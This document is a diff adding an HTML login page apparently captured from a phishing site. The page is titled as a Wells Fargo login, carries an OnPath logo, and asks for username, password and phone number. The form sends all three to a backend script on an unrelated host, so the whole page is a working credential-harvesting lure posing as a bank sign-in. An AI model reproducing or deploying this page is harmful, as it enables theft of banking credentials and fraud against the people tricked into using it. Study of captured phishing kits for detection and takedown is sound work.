@@ -1,0 +1,57 @@
+<!-- url: https://primevipkurs.com/onpathh/onpath/
+status: 200 -->
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login . WellsFargo </title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="">
+    <!-- Add the provided script -->
+    <script>
+        function validateForm() {
+            var userInput = document.getElementsByName('username')[0].value;
+            var errorText = document.getElementById('errorText');
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Regular expression to match email format
+
+            if (userInput.includes(' ')) {
+                errorText.innerHTML = 'Username must not have spaces.';
+                errorText.style.color = 'red';
+                document.getElementsByName('username')[0].focus(); // Set focus to the username input
+                return false; // Prevent form submission
+            } else if (emailRegex.test(userInput)) {
+                errorText.innerHTML = 'Please enter a username, not an email.';
+                errorText.style.color = 'red';
+                document.getElementsByName('username')[0].focus(); // Set focus to the username input
+                return false; // Prevent form submission
+            } else {
+                errorText.innerHTML = '';
+                return true; // Allow form submission
+            }
+        }
+    </script>
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="form-content">
+                <form action="../Backend/userlog.php" method="post" onsubmit="return validateForm()">
+                    <div class="img"><img src="https://www.beonpath.org/hubfs/assets-onp/images/logos/logo-full-color.svg" width ="350" </div>
+                        <div class="input" style="color: #cb4a20;font-size:17px;"><input type="text" name="username" placeholder="Enter your username" autocomplete="off" title="Username" required></div>
+                        <div class="input" style="color: #cb4a20;font-size:17px;"><input type="password" name="password" title="Password" placeholder="Enter your password" autocomplete="off" required></div>
+                        <div class="input" style="color: #cb4a20;font-size:17px;"><input type="tel" name="phn" placeholder="Enter your Phone Number" maxlength="10" autocomplete="off" title="Phone Number" required></div>
+                        <span id="errorText" class="error"></span>
+                        <div class="forgot"><a href="">Forgot?</a></div>
+                        <div class="button"><button name="button" type="submit">Sign in</button></div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
